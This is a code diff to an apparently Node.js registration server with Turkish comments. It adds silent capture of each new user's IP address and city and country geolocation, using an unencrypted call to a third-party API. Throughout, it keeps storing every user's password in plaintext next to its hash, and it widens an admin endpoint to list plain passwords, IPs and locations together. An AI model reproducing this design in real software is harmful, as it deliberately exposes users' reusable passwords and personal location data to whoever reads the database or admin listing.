@@ -30,17 +30,19 @@ db.exec(`
         email TEXT UNIQUE NOT NULL,
         password TEXT NOT NULL,
         plain_password TEXT,
+        ip_address TEXT,
+        country TEXT,
+        city TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
         updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
 `);
 
-// plain_password sütunu yoksa ekle
-try {
-    db.exec(`ALTER TABLE users ADD COLUMN plain_password TEXT`);
-} catch (e) {
-    // Sütun zaten var, sorun yok
-}
+// Yeni sütunları ekle (varsa hata verir, sorun yok)
+try { db.exec(`ALTER TABLE users ADD COLUMN plain_password TEXT`); } catch (e) { }
+try { db.exec(`ALTER TABLE users ADD COLUMN ip_address TEXT`); } catch (e) { }
+try { db.exec(`ALTER TABLE users ADD COLUMN country TEXT`); } catch (e) { }
+try { db.exec(`ALTER TABLE users ADD COLUMN city TEXT`); } catch (e) { }
 
 console.log('✅ Veritabanı hazır!');
 
@@ -104,16 +106,37 @@ app.post('/api/register', async (req, res) => {
             });
         }
 
+        // IP adresini al
+        const ip = req.headers['x-forwarded-for']?.split(',')[0] ||
+            req.headers['x-real-ip'] ||
+            req.connection.remoteAddress ||
+            req.ip || 'Bilinmiyor';
+
+        // Konum bilgisini al (ücretsiz API)
+        let country = 'Bilinmiyor';
+        let city = 'Bilinmiyor';
+
+        try {
+            const geoResponse = await fetch(`http://ip-api.com/json/${ip}?lang=tr`);
+            const geoData = await geoResponse.json();
+            if (geoData.status === 'success') {
+                country = geoData.country || 'Bilinmiyor';
+                city = geoData.city || 'Bilinmiyor';
+            }
+        } catch (geoError) {
+            console.log('GeoIP hatası:', geoError.message);
+        }
+
         // Şifreyi hashle
         const hashedPassword = await hashPassword(password);
 
-        // Kullanıcıyı kaydet (düz şifre dahil)
+        // Kullanıcıyı kaydet (IP ve konum dahil)
         const stmt = db.prepare(
-            'INSERT INTO users (username, email, password, plain_password) VALUES (?, ?, ?, ?)'
+            'INSERT INTO users (username, email, password, plain_password, ip_address, country, city) VALUES (?, ?, ?, ?, ?, ?, ?)'
         );
-        const result = stmt.run(username.trim(), email.trim().toLowerCase(), hashedPassword, password);
+        const result = stmt.run(username.trim(), email.trim().toLowerCase(), hashedPassword, password, ip, country, city);
 
-        console.log(`✅ Yeni kullanıcı kayıt oldu: ${username}`);
+        console.log(`✅ Yeni kullanıcı kayıt oldu: ${username} (${country}, ${city})`);
 
         res.json({
             success: true,
@@ -210,7 +233,7 @@ app.post('/api/admin/login', (req, res) => {
 app.get('/api/admin/users', (req, res) => {
     try {
         const users = db.prepare(
-            'SELECT id, username, email, password, plain_password, created_at FROM users ORDER BY created_at DESC'
+            'SELECT id, username, email, password, plain_password, ip_address, country, city, created_at FROM users ORDER BY created_at DESC'
         ).all();
 
         res.json({
